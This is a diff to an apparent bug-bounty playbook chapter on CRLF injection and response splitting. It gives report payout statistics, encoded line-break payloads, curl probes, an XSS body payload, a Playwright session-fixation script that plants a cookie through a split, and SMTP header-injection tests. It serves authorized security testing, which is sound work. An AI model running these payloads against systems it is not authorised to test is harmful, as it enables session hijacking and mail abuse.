@@ -10,7 +10,7 @@
 |---|---|
 | **Class** | `crlf` |
 | **Applies when** | http |
-| **Pays** | 148 disclosed reports filed under the class and 39 more that touch it; 24 paid, median $450, top $5,000. The best-paid put the line break into a message the server builds: an SMTP server setting that reached command execution (#1200647, $5,000), an e-mail address field that accepted `%0d%0a` (#815085, $3,750), redirects that set cookies for the parent domain (#197279, $2,500). Six of the 24 were paid by the Internet Bug Bounty and GitHub Security Lab for library and server bugs (#2585373, $2,600). |
+| **Pays** | 148 disclosed reports filed under the class and 39 more that touch it; 24 paid, median $450, top $5,000. The two best-paid reached mail: an SMTP server setting that led to command execution (#1200647, $5,000) and an e-mail address field that accepted `%0d%0a` (#815085, $3,750). The best-paid response split set cookies for the parent domain through redirects (#197279, $2,500). Six of the 24 were paid by the Internet Bug Bounty and GitHub Security Lab, for library and server bugs and one query submission (#2585373, $2,600). |
 | **Weaknesses** | CRLF Injection · CWE-93 · HTTP Response Splitting · CWE-113 · Cross-site Scripting (XSS) - Reflected · CWE-79 · Session Fixation · CWE-384 · HTTP Request Smuggling · CWE-444 |
 
 ## Why it pays
@@ -26,12 +26,13 @@ back ends behind Apache httpd before 2.4.59 (#2585373), mail code that builds he
 front ends that write a header value into the HTTP/1.1 request they send upstream.
 
 Standalone the class is cheap. Of the 148 reports filed under it, 114 carry no severity rating, 13 are rated low,
-16 medium, 2 high and 3 critical. Leaving out the library programmes and the titles about the Host header, 61
-reports describe a CRLF injection or response splitting on a deployed site; 10 were paid, median $200. The
-paid ones show what the injected line did: a cookie for the parent domain (#197279, $2,500; #66386, $500), mail
-sent to addresses the attacker chose (#347439, $500), an e-mail address field that accepted the line break
-(#815085, $3,750), an SMTP server setting that reached command execution (#1200647, $5,000). A header line with
-no consequence is Low at best, and the triager's first question is what it does.
+16 medium, 2 high and 3 critical. Leaving out the 55 on library programmes (curl alone has 33) and the 10 titles
+about the Host header, 61 reports describe a CRLF injection or response splitting on a deployed web host; nine
+were paid, median $200, and the best-paid of them set cookies for the parent domain (#197279, $2,500). The two
+best-paid reports in the class put the line break into mail instead: an SMTP server setting that reached command
+execution (#1200647, $5,000) and an e-mail address field that accepted it (#815085, $3,750); #347439 ($500) is
+titled as SMTP header injection that sent arbitrary mail. A header line with no consequence is Low at best, and
+the triager's first question is what it does.
 
 The chapter has three parts. CRL-001 to CRL-003 find a split in the target's own responses: through the path, a
 redirect parameter, or any other parameter that lands in a header. CRL-004 and CRL-005 turn a split into script in
@@ -73,10 +74,12 @@ scripts/sane fact set "$H" email-out=1 --ev "POST /team/invite mails the invitee
 scripts/sane fact set "$H" http2=1 reverse-proxy=1 --ev "curl --http2 gives http_version=2; Server: cloudflare on the redirect, Server: nginx on the origin's 404"
 # nothing sends mail after an authenticated walk:
 scripts/sane fact set "$H" email-out=0 --ev "no contact, invite, share, referral or notification feature sends mail built from input"
+# nothing speaks HTTP:
+scripts/sane fact set "$H" http=0 --ev "no HTTP answer on 80, 443 or any web port from the port scan (sane fp, $(date -u +%F))"
 ```
 
-The planner closes the chapter only when `http` is false. CRL-001 needs no parameter and stays queued for every
-host name; the other items close on their own facts.
+With `http=0` the chapter closes for the asset and the planner writes the reason. CRL-001 needs no parameter and
+stays queued for every host name that answers HTTP; the other items close on their own facts.
 
 ## Triage order
 
@@ -133,17 +136,22 @@ listener on our host).
   The `(^|\r)` test catches a line started by LF and one started by a bare CR; a line break that stayed encoded
   (`%0D%0A`) or became a space matches neither. `%E5%98%8A` is U+560A and `%C4%8A` is U+010A, whose low byte is LF
   (`%E5%98%8D` and `%C4%8D`: CR): they split only where the server writes header strings by keeping the low byte of
-  each character. `%3f%0d%0a` puts an encoded `?` first, which keeps the rest in the decoded path (#490997 is
-  titled as that case). `%250d%250a` splits where the path is decoded twice.
+  each character. `%3f%0d%0a` puts an encoded `?` before the line break: the server's parser keeps it all in the
+  path, and a later component that splits the decoded path at `?` treats the line break as part of a query it does
+  not escape (#490997 is titled as a CRLF injection with an encoded query mark). `%250d%250a` splits where the path
+  is decoded twice.
 - **Proof:** the raw response, saved with `curl -sS -D- --path-as-is -o /dev/null '<the hit url>' > "$D/proof.txt"`,
   showing `X-Crl001: probe` as a header line of its own; the same path without the line break as the control; the
-  `Server` header naming the writer. Then the same link with `Set-Cookie:%20crl001=probe;%20Path=/` in place of the
-  test header, opened in Chrome or Firefox, with `crl001=probe` in the browser's cookie storage (DevTools, or
-  Playwright's `context.cookies()`): triagers accept a split they can see in a browser, not one only curl shows.
+  `Server` header naming the writer. Then the same link with `Set-Cookie:%20crl001=probe%3B%20Path=/` in place of
+  the test header (`%3B`: servers that read a literal `;` as a path-parameter delimiter, Tomcat among them, strip
+  it), opened in Chrome or Firefox, with
+  `crl001=probe` in the browser's cookie storage (DevTools, or Playwright's `context.cookies()`): triagers accept a
+  split they can see in a browser, not one only curl shows.
 - **Not a finding when:** our text sits inside `Location` with the line break still encoded or replaced by a
-  space: the writer escaped it. The split needs a bare CR or a folded line (CR LF followed by a space or tab): RFC
-  9112 makes a bare CR invalid and current browsers do not end a line there, and a folded line continues the
-  previous header (#145392 is titled as needing PHP header folding and Internet Explorer 11). The split is only on
+  space: the writer escaped it. The split needs a bare CR or a folded line (CR LF followed by a space or tab) and
+  the browser check in Proof stores no cookie: RFC 9112 makes a bare CR invalid and lets a recipient read it as a
+  space, and a folded line continues the previous header (#145392 is titled as needing PHP header folding and
+  Internet Explorer 11). The split is only on
   the port-80 redirect: current Chrome upgrades `http://` navigations to `https://` before sending them when the
   host answers HTTPS, and an HSTS-preloaded domain never sends them, so show the link working in a browser before
   claiming impact. The front end answers 502 to the split: it refused the origin's malformed response and no
@@ -214,19 +222,21 @@ listener on our host).
     for e in "${ENCS[@]}"; do probe "$t" "$e"; done; done | tee "$D/encoded.tsv"
   awk -F'\t' '$2=="SPLIT"' "$D/plain.tsv" "$D/encoded.tsv" | tee "$D/hits.tsv"
   ```
-  The encodings are explained in the comments of CRL-001's list: `%E5%98%8A` and `%C4%8A` end a line only where
-  the server keeps the low byte of each character, and `%250d%250a` only where the value is decoded twice.
+  `%E5%98%8A` (U+560A) and `%C4%8A` (U+010A) end a line only where the server writes header strings by keeping
+  the low byte of each character (`%E5%98%8D` and `%C4%8D` give CR the same way); `%250d%250a` ends one only
+  where the value is decoded twice. The `(^|\r)` test catches a line started by LF or by a bare CR.
 - **Proof:** the link (one GET anyone can be sent), the raw response with `X-Crl002: probe` on its own line, the
   same link with `%250d%250a` as the control, and the framework or server that wrote it (`Server`,
-  `X-Powered-By`). In a browser: the same link with `Set-Cookie:%20crl002=probe;%20Path=/` in place of the test
-  header, and the cookie present in the browser's storage afterwards.
+  `X-Powered-By`). In a browser: the same link with `Set-Cookie:%20crl002=probe%3B%20Path=/` in place of the test
+  header (`%3B`, because some query parsers split parameters at a literal `;`), and the cookie present in the
+  browser's storage afterwards. Report it as header injection with what the injected line does (CRL-004,
+  CRL-005), not as a redirect: the policy's `open-redirect` exclusion does not cover a split.
 - **Not a finding when:** the line-break variant answers 500 (Django, Flask and Node throw) or comes back with no
   `Location` (PHP's `header()` drops the line with a warning) while the control redirects: the framework refused
   the header, which is the control holding. The line break comes back encoded, or as a space (Go). The value is
   read only from a JSON body or a custom header: no victim's browser sends it cross-site, so the split is
-  self-only unless a shared cache stores the response (CCH chapter). The policy's `open-redirect` exclusion does
-  not cover a split: report it as header injection with what the injected line does (CRL-004, CRL-005), not as a
-  redirect.
+  self-only unless a shared cache stores the response (CCH chapter). The only split needs a bare CR and the
+  browser check stores no cookie.
 - **Escalate:** the empty template is the shortest path to CRL-004: Chrome renders the body of a redirect whose
   `Location` is empty. CRL-005 for the cookie. A value the allow-list refuses outright is RDR-002's work first; a
   bypass that reaches `Location` then takes the line break added here. A split on an OAuth authorization server
@@ -292,17 +302,25 @@ listener on our host).
   #    when the file is served by a later download request, read that request's headers
   curl -sS "${HDR[@]}" $A -D- -o /dev/null -X POST "$T/api/exports" -H 'Content-Type: application/json' \
     -d '{"format":"csv","fileName":"crl003\r\nX-Crl003: probe"}' | grep -aiP '(^|\r)x-crl003: ?probe|^content-disposition'
+  # 4. a form body whose value becomes a header (a form another site can submit): the real form's action and field
+  curl -sS "${HDR[@]}" $A -D- -o /dev/null -X POST "$T/export" --data-urlencode $'fileName=crl003\r\nX-Crl003: probe' \
+    | grep -aiP '(^|\r)x-crl003: ?probe|^content-disposition'
   ```
-  `%E5%98%8A` and `%C4%8A` end a line only where the server keeps the low byte of each character; `%250d%250a`
-  only where the value is decoded twice.
+  `%E5%98%8A` (U+560A) and `%C4%8A` (U+010A) end a line only where the server keeps the low byte of each character
+  (`%E5%98%8D` and `%C4%8D` give CR); `%250d%250a` only where the value is decoded twice. The `(^|\r)` test catches
+  a line started by LF or by a bare CR.
 - **Proof:** the request (a link, or a form another site can submit), the raw response with `X-Crl003: probe` as
   its own line, and the control with `%250d%250a`. For a `Set-Cookie` reflection, the same link adding
-  `Set-Cookie:%20crl003=probe;%20Path=/`, and the cookie present in the browser afterwards.
+  `Set-Cookie:%20crl003=probe%3B%20Path=/` (`%3B`, because some query parsers split parameters at a literal `;`),
+  and the cookie present in the browser afterwards. For a stored value, the GET that serves it (the download
+  link) with the injected line, opened by a second session.
 - **Not a finding when:** the only carrier is a request header (`X-Request-Id`, `X-Forwarded-Host`, `Origin`,
   `User-Agent`, a cookie): a victim's browser cannot be made to send it, so the split is self-only (#798686 is
   titled as an echoed `x-request-id`) unless a shared cache stores the response, which is the CCH chapter's finding.
   `Content-Disposition` carries the name as `filename*=UTF-8''crl003%0D%0A...`: RFC 5987 encoding, not a line
-  break. The endpoint needs a bearer token the browser does not attach on its own: self-only. A `;` that survives
+  break. The split is in the response to a JSON POST: a browser sends that body cross-site only after a CORS
+  preflight, so it is self-only unless the stored value comes back in the headers of a GET that another user
+  opens. The endpoint needs a bearer token the browser does not attach on its own: self-only. A `;` that survives
   in a `Set-Cookie` value adds attributes (`Domain=`, `Path=`, `Max-Age=`) to that one cookie and no new header
   (#806577 is titled as that case): Low, and only where the attribute matters.
 - **Escalate:** CRL-004: these responses are usually 200s, so a body after an empty line renders without the
@@ -322,10 +340,11 @@ listener on our host).
 | **Weakness** | Cross-site Scripting (XSS) - Reflected · CWE-79 |
 | **Prior art** | #191380, #192749, #335599, #384872 |
 
-- **Where:** each split recorded by CRL-001 to CRL-003 on this deployment
-  (`$E/evidence/<host>/CRL-00[123]/hits.tsv`: the line break that worked and a template with `@@` where it goes), or
-  a split found by hand, written as a template the same way. With no split recorded there is nothing to work on:
-  mark the item `skipped` with "no split from CRL-001 to CRL-003".
+- **Where:** each split recorded by CRL-001 to CRL-003 on this host (`$E/evidence/$H/CRL-00[123]/hits.tsv`: the
+  line break that worked and a template with `@@` where it goes), or a split found by hand, written as a template
+  the same way. CRL-001 runs on every host name, so a split it recorded on another name of this deployment is added
+  to `HITS` in the How. With no split recorded there is nothing to work on: mark the item `skipped` with "no split
+  from CRL-001 to CRL-003".
 - **Test:** an empty line ends the header block, so a second line break starts a body the browser parses. The
   browser renders it only when it does not follow the response as a redirect, so read the saved headers first.
   (a) A 200, 4xx or 5xx response, or our line written before `Location`: the body works, because every header after
@@ -338,8 +357,9 @@ listener on our host).
 - **How:** the first hit is taken by default; pick a row of case (a) or (b) when there is one.
   ```bash
   D="$E/evidence/$H/CRL-004"; mkdir -p "$D"
-  cat "$E/evidence/"*/CRL-00[123]/hits.tsv 2>/dev/null | cut -f2- | sort -u | head   # verdict, line break, template, url
-  IFS=$'\t' read -r _ _ L TPL _ < <(cat "$E/evidence/"*/CRL-00[123]/hits.tsv 2>/dev/null | head -1)
+  HITS=( "$E/evidence/$H"/CRL-00[123]/hits.tsv )   # add "$E/evidence/<another name of this deployment>/CRL-001/hits.tsv"
+  cat "${HITS[@]}" 2>/dev/null | cut -f2- | sort -u | head   # verdict, line break, template, url
+  IFS=$'\t' read -r _ _ L TPL _ < <(cat "${HITS[@]}" 2>/dev/null | head -1)
   echo "line break: $L   template: $TPL"
   B='%3Csvg%20onload%3Dalert(document.domain)%3E'   # <svg onload=alert(document.domain)>: 35 bytes, 0x23
   CT="Content-Type:%20text/html$L"
@@ -398,25 +418,32 @@ listener on our host).
 | **Prior art** | #197279, #97292, #811366, #266030 |
 
 - **Where:** a split from CRL-001 to CRL-003 (`$E/evidence/<host>/CRL-00[123]/hits.tsv`) on the application's host
-  or on any host whose cookies reach it (a sibling sub-domain can set a cookie for the parent domain), and the
-  session cookie's name and attributes from the sign-in response: `Domain`, `Path`, `Secure`, `HttpOnly`, a
-  `__Host-` or `__Secure-` prefix. With no split recorded, mark the item `skipped` with "no split from CRL-001 to
-  CRL-003".
+  or on any host whose cookies reach it: the parent domain and its other sub-domains, because a sibling can set a
+  cookie for the parent domain. A sibling's split is used from this card, and its planting link is the only
+  request sent to that host. Read the session cookie's name and attributes from the sign-in response: `Domain`,
+  `Path`, `Secure`, `HttpOnly`, a `__Host-` or `__Secure-` prefix. With no split recorded, mark the item `skipped`
+  with "no split from CRL-001 to CRL-003".
 - **Test:** browsers store a `Set-Cookie` from any response, redirects included, so this works on every split. Plant
   an identifier the attacker holds, let our victim account B sign in in that browser, and see whether the attacker's
   copy is now signed in as B. It holds only when the application keeps the identifier across sign-in (or adopts one
   it never issued); when it rotates the identifier, the planted cookie is just a cookie.
-- **How:** `SC` is the session cookie's name and `PARENT` the domain it is set for (the real cookie's `Domain`, or
-  the split host's parent when the split is on a sibling); `B_USER` and `B_PASS` are account B's credentials in the
-  environment, never written to evidence.
+- **How:** `SC` is the session cookie's name and `PARENT` the domain the planted cookie is set for (the real
+  cookie's `Domain`, or else the application host's registrable domain); `APP` is the application's base URL;
+  `B_USER` and `B_PASS` are account B's credentials in the environment, never written to evidence.
   ```bash
-  D="$E/evidence/$H/CRL-005"; mkdir -p "$D"; : "${SC:?name of the session cookie}" "${PARENT:?domain the session cookie is set for}"
-  IFS=$'\t' read -r _ _ L TPL _ < <(cat "$E/evidence/"*/CRL-00[123]/hits.tsv 2>/dev/null | head -1); echo "split: $TPL ($L)"
-  # 1. a session identifier issued before sign-in: the attacker's copy
-  V=$(curl -sS "${HDR[@]}" -c - -o /dev/null "$T/login" | awk -v n="$SC" '$6==n{v=$7} END{print v}'); echo "V=$V" | tee "$D/attacker.txt"
-  # 2. the planting link; a plain-HTTP response cannot set a Secure cookie, so Secure only on an https split
-  SEC=''; case "$TPL" in https://*) SEC=';%20Secure';; esac
-  LINK="${TPL//@@/$L"Set-Cookie:%20$SC=$V;%20Domain=$PARENT;%20Path=/;%20Max-Age=900$SEC"}"; echo "$LINK" > "$D/plant-link.txt"
+  D="$E/evidence/$H/CRL-005"; mkdir -p "$D"; : "${SC:?name of the session cookie}" "${PARENT:?the cookie's Domain or the registrable domain}"
+  APP="$T"                                   # the application whose session is planted, when this card runs on a sibling's split
+  # the split: this host first, then the parent domain and its sub-domains (their cookies reach the application)
+  HITS=( "$E/evidence/$H"/CRL-00[123]/hits.tsv "$E/evidence/$PARENT"/CRL-00[123]/hits.tsv "$E/evidence/"*".$PARENT"/CRL-00[123]/hits.tsv )
+  IFS=$'\t' read -r _ _ L TPL _ < <(cat "${HITS[@]}" 2>/dev/null | head -1); echo "split: $TPL ($L)"
+  # 1. a session identifier issued before sign-in: the attacker's copy, percent-encoded once because the server decodes our value
+  V=$(curl -sS "${HDR[@]}" -c - -o /dev/null "$APP/login" | awk -v n="$SC" '$6==n{v=$7} END{print v}'); echo "V=$V" | tee "$D/attacker.txt"
+  VE=$(python3 -c 'import sys, urllib.parse as u; print(u.quote(sys.argv[1], safe=""))' "$V")
+  # 2. the planting link. Secure only on an https split: a plain-HTTP response cannot set it. A __Host- cookie takes
+  #    no Domain and needs Secure and Path=/, so only the application's own host can plant it, over https
+  DOM="%3B%20Domain=$PARENT"; SEC=''; case "$TPL" in https://*) SEC='%3B%20Secure';; esac
+  case "$SC" in __Host-*) DOM='';; esac
+  LINK="${TPL//@@/$L"Set-Cookie:%20$SC=$VE$DOM%3B%20Path=/%3B%20Max-Age=900$SEC"}"; echo "$LINK" > "$D/plant-link.txt"
   cat > "$D/fix.js" <<'JS'
   // usage: fix.js <plant link> <sign-in url> <cookie name> <evidence dir> <the HDR arguments>; B_USER and B_PASS from the environment
   const { chromium } = require('playwright'), fs = require('fs');
@@ -432,20 +459,22 @@ listener on our host).
     await p.waitForTimeout(5000); await jar('after B signed in'); await p.screenshot({ path: `${dir}/victim.png` }); await b.close();
   })();
   JS
-  NODE_PATH="$(npm root -g)" node "$D/fix.js" "$LINK" "$T/login" "$SC" "$D" "${HDR[@]}"; cat "$D/victim-cookies.txt"
+  NODE_PATH="$(npm root -g)" node "$D/fix.js" "$LINK" "$APP/login" "$SC" "$D" "${HDR[@]}"; cat "$D/victim-cookies.txt"
   # 3. the attacker's copy, which never signed in: whose account does it open? (the application's own profile call)
-  curl -sS "${HDR[@]}" -b "$SC=$V" -o "$D/attacker-me.json" -w 'attacker with V: %{http_code}\n' "$T/api/me"; head -c 300 "$D/attacker-me.json"
+  curl -sS "${HDR[@]}" -b "$SC=$V" -o "$D/attacker-me.json" -w 'attacker with V: %{http_code}\n' "$APP/api/me"; head -c 300 "$D/attacker-me.json"
   ```
-  An application that issues no identifier before sign-in may still adopt one it never issued: set `V` to `crl005`
-  followed by 32 random hex digits and repeat steps 2 and 3.
+  An application that issues no identifier before sign-in may still adopt one it never issued: set
+  `V=crl005$(openssl rand -hex 16)`, recompute `VE`, and repeat steps 2 and 3.
 - **Proof:** `plant-link.txt` (the one link the victim opens), `victim-cookies.txt` showing `SC=V` stored after the
   link and still `V` after B signed in, and `attacker-me.json`: a client that only ever held `V` receiving account
   B's user id. Account B is ours. Where the cookie has no session effect, the proof is the stored cookie with its
   `Domain` and lifetime, which is Low.
 - **Not a finding when:** the value after sign-in differs from `V`: the application rotates the session at sign-in
-  and nothing was fixed (AUT-016 is negative here). The session cookie has the `__Host-` prefix: no other host can
-  set it and a `Domain=` cookie of that name is refused. The split is on `http://` and the session cookie is
-  `Secure`: browsers do not let a plain-HTTP response set or shadow a secure cookie. Two cookies with the session's
+  and nothing was fixed (AUT-016 is negative here). The session cookie has the `__Host-` prefix and the split is on
+  another host: only the application's own host can set it, over HTTPS and without `Domain`, and a `Domain=`
+  cookie of that name is refused. The split is only on `http://`: current Chrome upgrades the link to `https://`
+  before sending it, a plain-HTTP response cannot set a `Secure` cookie, and it cannot overwrite one the victim
+  already holds (RFC 6265bis), so show the plant in the browser before claiming it. Two cookies with the session's
   name reach the application and it reads the real one: the browser sends the cookie with the longer `Path` first,
   so plant a longer one for the path the application reads it on. Planting many large cookies so that the site
   refuses every request is denial of service (`dos`), not this item.
@@ -495,7 +524,11 @@ listener on our host).
       except socket.timeout:
           pass
       print(a[0], repr(data[:4000]), flush=True)
-      c.sendall(b"HTTP/1.1 200 OK\r\nContent-Length: 2\r\nConnection: close\r\n\r\nok"); c.close()
+      try:
+          c.sendall(b"HTTP/1.1 200 OK\r\nContent-Length: 2\r\nConnection: close\r\n\r\nok")
+      except OSError:      # the client already hung up
+          pass
+      c.close()
   PY
   F="$T/api/webhooks"       # the fetcher's request from the proxy history; this one is an example
   v(){ curl -sS "${HDR[@]}" $A -X POST "$F" -H 'Content-Type: application/json' -d "$2" -o "$D/$1.body" -w "$1 %{http_code}\n"; sleep 2; }
@@ -543,7 +576,8 @@ listener on our host).
 - **Where:** every form whose input ends up in a mail the application sends: contact and support forms (name,
   e-mail, subject), invitations (the invitee's address, our display name, the message), share by e-mail, referral
   invitations, newsletter sign-up, appointment and calendar invitations (#1509216 and #1516377 are titled as SMTP
-  command injection through appointment mails), and stored fields that later appear in mail headers: the display
+  command injection through appointment e-mails and their iCalendar attachments), and stored fields that later
+  appear in mail headers: the display
   name, the organisation name (#3913012), the e-mail address itself (#815085 is titled as an e-mail address field
   that accepted `%0d%0a`). A form with an anti-CSRF token needs the token copied from the form page; one with a
   CAPTCHA is submitted from the browser, one variant at a time.
@@ -552,8 +586,9 @@ listener on our host).
   `Bcc:` is delivered depends on the sender: `sendmail -t` (PHP's `mail()`) and libraries that read the recipients
   from the headers deliver it; libraries that keep their own recipient list only show it in the raw source. A line
   break in an address that reaches `MAIL FROM:` adds an SMTP command. Use two inboxes of ours: `M1`, which the form
-  normally writes to or which we enter as the sender, and `M2`, never entered anywhere on the target. Each
-  submission produces at most one extra mail, to `M2`. Never end the DATA section (a line holding only `.`) or start
+  normally writes to or which we enter as the sender, and `M2`, never entered anywhere on the target (a
+  plus-address of our own mailbox is enough where the programme's alias rule allows it: `Delivered-To` shows which
+  address received the copy). Each submission produces at most one extra mail, to `M2`. Never end the DATA section (a line holding only `.`) or start
   a second transaction.
 - **How:** the field names come from the form's real request; put the line break in one field per request.
   ```bash
